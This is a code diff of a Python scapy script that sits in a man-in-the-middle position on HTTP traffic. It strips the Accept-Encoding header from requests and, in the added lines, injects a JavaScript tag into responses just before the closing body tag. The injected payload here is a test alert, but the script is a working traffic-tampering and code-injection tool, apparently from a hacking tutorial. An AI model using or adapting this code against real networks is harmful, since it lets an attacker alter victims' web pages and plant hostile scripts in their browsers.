@@ -5,6 +5,7 @@ import scapy.all as scapy
 import re
 
 regex_string = 'Accept-Encoding:.*?\\r\\n'
+js = " <script> alert('test') </script> "
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -21,11 +22,15 @@ def proccess_packet(packet):
             modified_load =re.sub(regex_string, "", scapy_packet[scapy.Raw].load)
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(str(new_packet))
-            print(scapy_packet.show())
+            # print(scapy_packet.show())
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("\n[+] HTTP Response")
-            print(scapy_packet.show())
+            print(scapy_packet[scapy.Raw].load)
+            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "{}</body>".format(js))
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
+            # print(scapy_packet.show())
 
     packet.accept()
 
